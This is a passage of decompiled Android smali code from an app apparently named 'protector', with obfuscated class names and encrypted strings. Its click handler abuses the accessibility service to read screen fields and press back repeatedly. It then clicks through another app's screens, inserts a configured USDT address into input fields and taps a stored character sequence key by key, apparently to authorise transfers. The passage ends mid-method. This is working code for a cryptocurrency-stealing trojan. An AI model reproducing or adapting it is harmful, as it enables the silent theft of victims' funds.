.class Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->g(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic b:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 1
    iput-object p1, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 16

    .line 1
    move-object/from16 v1, p0

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0}, Lcom/icontrol/protector/a;->d(Ljava/lang/Boolean;)V

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x28

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-ne v2, v5, :cond_0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->b(Ljava/lang/String;)Ljava/lang/String;

    :cond_0
    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x25

    new-array v6, v2, [B

    fill-array-data v6, :array_2

    new-array v7, v3, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    if-ne v6, v5, :cond_1

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->d(Ljava/lang/String;)Ljava/lang/String;

    :cond_1
    sget-object v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->e:Landroid/widget/FrameLayout;

    sget-object v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->a:Landroid/widget/TextView;

    invoke-virtual {v0, v6}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v6, 0xbb8

    :try_start_0
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_9

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v8, 0x26

    new-array v8, v8, [B

    fill-array-data v8, :array_4

    new-array v9, v3, [B

    fill-array-data v9, :array_5

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v8

    const/16 v9, 0x10

    if-ne v8, v5, :cond_2

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    const-wide/16 v10, 0x3e8

    :try_start_1
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_8

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v8, 0x1c

    const/4 v12, 0x2

    if-eqz v0, :cond_4

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    new-array v13, v8, [B

    fill-array-data v13, :array_6

    new-array v14, v3, [B

    fill-array-data v14, :array_7

    invoke-static {v13, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v0, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v13

    if-ne v13, v5, :cond_3

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v13

    check-cast v13, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v13, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    invoke-virtual {v13, v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    invoke-virtual {v13, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    invoke-virtual {v13, v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    if-eqz v13, :cond_3

    invoke-virtual {v13, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_3
    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v13

    if-nez v13, :cond_4

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v13, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$a;

    invoke-direct {v13, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$a;-><init>(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;)V

    invoke-static {v0, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->e(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :cond_4
    :try_start_2
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_7

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v6, 0x27

    new-array v6, v6, [B

    fill-array-data v6, :array_8

    new-array v7, v3, [B

    fill-array-data v7, :array_9

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    if-ne v6, v5, :cond_5

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_5
    const-wide/16 v6, 0x12c

    :try_start_3
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_6

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v13, 0x1e

    new-array v14, v13, [B

    fill-array-data v14, :array_a

    new-array v15, v3, [B

    fill-array-data v15, :array_b

    invoke-static {v14, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v0, v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v14

    const/4 v15, 0x4

    const/high16 v10, 0x200000

    if-ne v14, v5, :cond_6

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v11, Landroid/os/Bundle;

    invoke-direct {v11}, Landroid/os/Bundle;-><init>()V

    new-array v14, v2, [B

    fill-array-data v14, :array_c

    new-array v13, v3, [B

    fill-array-data v13, :array_d

    invoke-static {v14, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    new-array v14, v15, [B

    fill-array-data v14, :array_e

    new-array v15, v3, [B

    fill-array-data v15, :array_f

    invoke-static {v14, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v13, v14}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v10, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_6
    const-wide/16 v13, 0x1f4

    :try_start_4
    invoke-static {v13, v14}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_5

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v11, 0x1f

    new-array v11, v11, [B

    fill-array-data v11, :array_10

    new-array v13, v3, [B

    fill-array-data v13, :array_11

    invoke-static {v11, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v0, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v11

    if-ne v11, v5, :cond_7

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_7

    invoke-virtual {v0, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_7
    :try_start_5
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_4

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    new-array v8, v8, [B

    fill-array-data v8, :array_12

    new-array v11, v3, [B

    fill-array-data v11, :array_13

    invoke-static {v8, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v8

    if-lt v8, v12, :cond_8

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v11, Landroid/os/Bundle;

    invoke-direct {v11}, Landroid/os/Bundle;-><init>()V

    new-array v12, v2, [B

    fill-array-data v12, :array_14

    new-array v13, v3, [B

    fill-array-data v13, :array_15

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    sget-object v13, Lcom/icontrol/protector/My_Configs;->usdtadress:Ljava/lang/String;

    invoke-virtual {v11, v12, v13}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v8, v10, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v8, Landroid/os/Bundle;

    invoke-direct {v8}, Landroid/os/Bundle;-><init>()V

    new-array v2, v2, [B

    fill-array-data v2, :array_16

    new-array v11, v3, [B

    fill-array-data v11, :array_17

    invoke-static {v2, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v11, 0x4

    new-array v11, v11, [B

    fill-array-data v11, :array_18

    new-array v12, v3, [B

    fill-array-data v12, :array_19

    invoke-static {v11, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v8, v2, v11}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v10, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    const-wide/16 v10, 0xc8

    :try_start_6
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :cond_8
    :goto_0
    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x1e

    new-array v2, v2, [B

    fill-array-data v2, :array_1a

    new-array v8, v3, [B

    fill-array-data v8, :array_1b

    invoke-static {v2, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-ne v2, v5, :cond_9

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_9
    const-wide/16 v10, 0x3e8

    :try_start_7
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_7} :catch_3

    sget-object v0, Lcom/icontrol/protector/y;->m:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    array-length v2, v0

    move v8, v4

    :goto_1
    if-ge v8, v2, :cond_b

    aget-char v10, v0, v8

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v12, 0x1b

    new-array v12, v12, [B

    fill-array-data v12, :array_1c

    new-array v13, v3, [B

    fill-array-data v13, :array_1d

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const/4 v10, 0x3

    new-array v10, v10, [B

    fill-array-data v10, :array_1e

    new-array v12, v3, [B

    fill-array-data v12, :array_1f

    invoke-static {v10, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    iget-object v11, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v11, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v11}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    invoke-virtual {v11, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v10

    invoke-interface {v10}, Ljava/util/List;->size()I

    move-result v11

    if-ne v11, v5, :cond_a

    invoke-interface {v10, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v10, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :try_start_8
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_8
    .catch Ljava/lang/InterruptedException; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :cond_a
    :goto_2
    add-int/lit8 v8, v8, 0x1

    goto :goto_1

    :cond_b
    const-wide/16 v6, 0x7d0

    :try_start_9
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_9
    .catch Ljava/lang/InterruptedException; {:try_start_9 .. :try_end_9} :catch_2

    iget-object v0, v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

